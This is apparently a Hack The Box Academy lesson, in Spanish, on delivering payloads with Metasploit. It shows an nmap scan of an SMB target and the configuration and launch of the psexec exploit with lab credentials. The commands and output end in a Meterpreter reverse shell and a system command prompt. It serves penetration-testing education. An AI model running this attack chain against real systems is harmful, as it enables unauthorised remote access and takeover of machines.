# Automating Payloads & Delivery with Metasploitpo

Metasploit es un marco de ataque automatizado desarrollado por Rapid7 que agiliza el proceso de explotación de vulnerabilidades a través del uso de módulos preconstruidos que contienen opciones fáciles de usar para explotar vulnerabilidades y entregar payloads con el fin de obtener una shell en un sistema vulnerable. Puede hacer que explotar un sistema vulnerable sea tan fácil que algunos proveedores de capacitación en ciberseguridad limitan la cantidad de veces que se puede utilizar en exámenes de laboratorio. Aquí en Hack The Box, fomentamos la experimentación con herramientas en nuestros entornos de laboratorio hasta que tengas una comprensión sólida y fundamental. La mayoría de las organizaciones no nos limitarán en qué herramientas podemos o no usar en un compromiso. Sin embargo, esperarán que sepamos lo que estamos haciendo. Por lo tanto, es nuestra responsabilidad buscar una comprensión a medida que aprendemos. No entender los efectos de las herramientas que utilizamos puede ser destructivo en una prueba de penetración o auditoría en vivo. Esta es una de las principales razones por las que debemos buscar constantemente una comprensión más profunda de las herramientas, técnicas, metodologías y prácticas que aprendemos.

Interactuaremos con la edición comunitaria de Metasploit en Pwnbox. Utilizaremos módulos preconstruidos y crearemos payloads con MSFVenom. Es importante notar que muchas empresas de ciberseguridad establecidas utilizan la edición de pago de Metasploit, llamada Metasploit Pro, para llevar a cabo pruebas de penetración, auditorías de seguridad e incluso campañas de ingeniería social. Si deseas explorar las diferencias entre la edición comunitaria y Metasploit Pro, puedes consultar esta tabla de comparación.

## Practicando con Metasploit

Podríamos pasar el resto de este módulo cubriendo todo sobre Metasploit, pero solo vamos a ir tan lejos como trabajar con lo básico en el contexto de shells y payloads.

Comencemos a trabajar de manera práctica con Metasploit lanzando la consola del marco Metasploit como root (`sudo msfconsole`).

### **Iniciando MSF**

```bash
sherlock28@htb[/htb]$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```

Podemos ver que se presenta un arte ASCII creativo como banner al inicio y algunos números de particular interés:

* **2131 exploits**
* **592 payloads**

Estos números pueden cambiar a medida que los mantenedores agregan y eliminan código o si importas un módulo para usar en Metasploit. Familiaricémonos con los payloads de Metasploit utilizando un módulo de explotación clásico que se puede usar para comprometer un sistema Windows. Recuerda que Metasploit se puede usar para más que solo explotación. También podemos utilizar diferentes módulos para escanear y enumerar objetivos.

En este caso, utilizaremos los resultados de enumeración de un escaneo de nmap para seleccionar un módulo de Metasploit para usar.

### Escaneo NMAP

```bash
sherlock28@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
```

| PORT    | STATE | SERVICE      | VERSION                                                      |
| ------- | ----- | ------------ | ------------------------------------------------------------ |
| 135/tcp | open  | msrpc        | Microsoft Windows RPC                                        |
| 139/tcp | open  | netbios-ssn  | Microsoft Windows netbios-ssn                                |
| 445/tcp | open  | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |

```yaml
|_nbstat: Nombre NetBIOS: nil, Usuario NetBIOS: <unknown>, MAC NetBIOS: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (peligroso, pero por defecto)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

En la salida, vemos varios puertos estándar que suelen estar abiertos en un sistema Windows de forma predeterminada. Recuerda que escanear y enumerar es una excelente manera de conocer qué sistema operativo (Windows o Linux) está ejecutando nuestro objetivo para encontrar un módulo apropiado para ejecutar con Metasploit. Optaremos por SMB (escuchando en 445) como el vector de ataque potencial.

Una vez que tengamos esta información, podemos usar la funcionalidad de búsqueda de Metasploit para descubrir módulos que están asociados con SMB. En el msfconsole, podemos emitir el comando `search smb` para obtener una lista de módulos asociados con las vulnerabilidades de SMB.

### Buscando dentro de Metasploit

```bash
msf6 > search smb
```

```css
=================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

Veremos una larga lista de módulos coincidentes asociados con nuestra búsqueda. Nota el formato en que está cada módulo. Cada módulo tiene un número listado en el extremo izquierdo de la tabla para facilitar la selección del módulo, un Nombre, Fecha de divulgación, Rango, Comprobación y Descripción.

> El número a la `izquierda` de cada módulo potencial es un número relativo basado en tu búsqueda que puede cambiar a medida que se añaden módulos a Metasploit. No esperes que este número coincida cada vez que realices la búsqueda o intentes usar el módulo.

Veamos un módulo en particular para entenderlo dentro del contexto de los payloads.

#### Módulo: `56 exploit/windows/smb/psexec`

| Salida   | Significado                                                                                                                                                                    |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 56       | El número asignado al módulo en la tabla dentro del contexto de la búsqueda. Este número facilita la selección. Podemos usar el comando `use 56` para seleccionar el módulo.   |
| exploit/ | Esto define el tipo de módulo. En este caso, es un módulo de explotación. Muchos módulos de explotación en MSF incluyen el payload que intenta establecer una sesión de shell. |
| windows/ | Esto define la plataforma que estamos atacando. En este caso, sabemos que el objetivo es Windows, por lo que el exploit y el payload serán para Windows.                       |
| smb/     | Esto define el servicio para el cual se ha escrito el payload en el módulo.                                                                                                    |
| psexec   | Esto define la herramienta que se cargará en el sistema objetivo si es vulnerable.                                                                                             |

Una vez que seleccionemos el módulo, notaremos un cambio en el prompt que nos da la capacidad de configurar el módulo basado en parámetros específicos de nuestro entorno.

### Selección de Opciones

```bash
msf6 > use 56
```

```css
[*] No hay payload configurado, predeterminado a windows/meterpreter/reverse_tcp
```

```bash
msf6 exploit(windows/smb/psexec) > 
```

Nota cómo "exploit" está fuera de los paréntesis. Esto puede interpretarse como que el tipo de módulo de MSF es un exploit, y el exploit específico y el payload están escritos para Windows. El vector de ataque es SMB, y el payload de Meterpreter se entregará usando psexec. Aprendamos más sobre cómo usar este exploit y entregar el payload usando el comando `options`.

### Examinando las Opciones de un Exploit

```bash
msf6 exploit(windows/smb/psexec) > options
```

**Opciones del módulo (exploit/windows/smb/psexec):**

| Nombre                 | Configuración Actual | Requerido | Descripción                                                                                                                                        |
| ---------------------- | -------------------- | --------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| RHOSTS                 |                      | sí        | El(los) host(s) objetivo(s), rango, identificador CIDR o archivo de hosts con la sintaxis 'file:\<ruta>'                                           |
| RPORT                  | 445                  | sí        | El puerto del servicio SMB (TCP)                                                                                                                   |
| SERVICE\_DESCRIPTION   |                      | no        | Descripción del servicio que se utilizará en el objetivo para un listado bonito                                                                    |
| SERVICE\_DISPLAY\_NAME |                      | no        | El nombre para mostrar del servicio                                                                                                                |
| SERVICE\_NAME          |                      | no        | El nombre del servicio                                                                                                                             |
| SHARE                  |                      | no        | El recurso compartido al que conectarse, puede ser un recurso compartido administrativo (ADMIN$, C$,...) o una carpeta normal de lectura/escritura |
| SMBDomain              | .                    | no        | El dominio de Windows que se utilizará para la autenticación                                                                                       |
| SMBPass                |                      | no        | La contraseña para el nombre de usuario especificado                                                                                               |
| SMBUser                |                      | no        | El nombre de usuario para autenticarse                                                                                                             |

**Opciones del payload (windows/meterpreter/reverse\_tcp):**

| Nombre   | Configuración Actual | Requerido | Descripción                                                   |
| -------- | -------------------- | --------- | ------------------------------------------------------------- |
| EXITFUNC | thread               | sí        | Técnica de salida (Aceptados: '', seh, thread, process, none) |
| LHOST    | 68.183.42.102        | sí        | La dirección de escucha (se puede especificar una interfaz)   |
| LPORT    | 4444                 | sí        | El puerto de escucha                                          |

**Objetivo del exploit:**

| Id | Nombre     |
| -- | ---------- |
| 0  | Automático |

Esta es una de las áreas donde Metasploit brilla en términos de facilidad de uso. En la salida de las opciones del módulo, vemos varias opciones y configuraciones con una descripción de lo que significa cada configuración. No utilizaremos `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` y `SERVICE_NAME` en esta sección. Nota cómo este exploit en particular utilizará una conexión de shell TCP inversa que utiliza Meterpreter. Un shell de Meterpreter nos brinda muchas más funcionalidades que un shell TCP inverso sin procesar, como establecimos en las secciones anteriores de este módulo. Es el payload predeterminado que se utiliza en Metasploit.

Queremos utilizar el comando `set` para configurar las siguientes opciones de la siguiente manera:

### Configuración de Opciones

#### Automatización de Payloads y Entrega con Metasploit

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Estas configuraciones asegurarán que nuestro payload se entregue al objetivo correcto (RHOSTS), se suba al recurso compartido administrativo predeterminado (ADMIN$) utilizando las credenciales (SMBPass y SMBUser), y luego inicie una conexión de shell inverso con nuestra máquina local (LHOST).

Estas configuraciones serán específicas para la dirección IP en tu máquina de ataque y en la máquina objetivo, así como con las credenciales que puedas recopilar en un compromiso. Podemos establecer la dirección IP del túnel VPN de LHOST (máquina local) o el ID de interfaz del túnel VPN.

### Exploits en marcha

#### Automatización de Payloads y Entrega con Metasploit

```bash
msf6 exploit(windows/smb/psexec) > exploit
```

```less
[*] Iniciado el manejador TCP inverso en 10.10.14.222:4444 
[*] 10.129.180.71:445 - Conectando al servidor...
[*] 10.129.180.71:445 - Autenticando a 10.129.180.71:445 como usuario 'htb-student'...
[*] 10.129.180.71:445 - Seleccionando el objetivo de PowerShell
[*] 10.129.180.71:445 - Ejecutando el payload...
[+] 10.129.180.71:445 - El inicio del servicio ha excedido el tiempo de espera, OK si se ejecuta un comando o ejecutable no de servicio...
[*] Enviando la etapa (175174 bytes) a 10.129.180.71
[*] Sesión de Meterpreter 1 abierta (10.10.14.222:4444 -> 10.129.180.71:49675) a las 2021-09-13 17:43:41 +0000

meterpreter > 
```

Después de emitir el comando `exploit`, se ejecuta el exploit y se intenta entregar el payload en el objetivo utilizando el payload de Meterpreter. Metasploit informa cada paso de este proceso, como se ve en la salida. Sabemos que esto fue exitoso porque se envió una etapa con éxito, lo que estableció una sesión de shell de Meterpreter (meterpreter >) y una sesión de shell a nivel de sistema. Ten en cuenta que Meterpreter es un payload que utiliza inyección DLL en memoria para establecer de manera sigilosa un canal de comunicación entre una máquina de ataque y un objetivo. Las credenciales adecuadas y el vector de ataque pueden darnos la capacidad de cargar y descargar archivos, ejecutar comandos del sistema, ejecutar un keylogger, crear/iniciar/detener servicios, gestionar procesos, y más.

En este caso, como se detalla en la documentación del módulo de Rapid 7: "Este módulo utiliza un nombre de usuario y contraseña de administrador válidos (o hash de contraseña) para ejecutar un payload arbitrario. Este módulo es similar a la utilidad "psexec" proporcionada por SysInternals. Este módulo ahora puede limpiarse después de sí mismo. El servicio creado por esta herramienta utiliza un nombre y descripción elegidos al azar."

Al igual que otros intérpretes de lenguaje de comandos (Bash, PowerShell, ksh, etc.), las sesiones de shell de Meterpreter nos permiten emitir un conjunto de comandos que podemos usar para interactuar con el sistema objetivo. Podemos usar `?` para ver una lista de comandos que podemos utilizar. Notaremos limitaciones con la shell de Meterpreter, por lo que es bueno intentar usar el comando `shell` para acceder a una shell a nivel de sistema si necesitamos trabajar con el conjunto completo de comandos nativos de nuestro objetivo.

### **Shell Interactiva**

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```
